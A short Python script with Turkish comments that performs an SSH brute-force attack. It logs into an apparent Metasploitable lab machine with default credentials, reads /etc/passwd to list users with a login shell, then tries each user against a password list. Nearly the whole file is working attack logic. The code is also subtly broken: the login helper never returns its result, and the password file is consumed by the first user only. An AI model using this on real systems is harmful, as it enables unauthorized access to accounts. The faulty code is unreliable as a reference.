# Bu proje ile SSH connection yapıp ,en çok bilinen 100 parola ile brute force attack yapılışı kodlandı

import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy() )

ip = "10.0.2.6"   # metasploitable makine ip si
port = 22
username = "msfadmin"
password = "msfadmin"

ssh.connect ( ip, port=port , username=username , password= password)

command = 'cat /etc/passwd'  # karşı tarafta çalıştıracağımız komut

stdin , stdout, stderr = ssh.exec_command(command)


cmd_output = stdout.read()
ssh.close()

# print(cmd_output)


# Satır satır yazdırmak için
etcpasswd = cmd_output.decode().split("\n")   

user_list = []


for ep in etcpasswd :
	
	if '/bin/bash' in ep or '/bin/sh' in ep :
		user = ep.split(":")[0]
		user_list.append(user)


print(user_list)

# Password dosyasını açıp yazdıralım
f = open ( "password.txt" ,"r")

# Passwordları yazdırma
#for password in f :
#	print(password.strip())


def trySsh (user,password):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy() )

	succcess = False

	try:
		ssh.connect(ip, username = user , password= password.strip(), timeout= 0.1 , banner_timeout=0.1)
		succcess = True

		
	except Exception as e:
		pass
	finally:
		ssh.close()







for user in user_list :
	
	if(trySsh(user,user)):

		print("Bağlantı kuruldu.. Kullanıcı adı: ", user , "Şifre : " ,user )
	
	else:	
		for password in f:
			print(user, ":" ,password.strip() )
			
			if (trySsh (user,password)):
				print("Bağlantı kuruldu.. Kullanıcı adı: ", user , "Şifre : " ,password.strip() )
	
		
		

		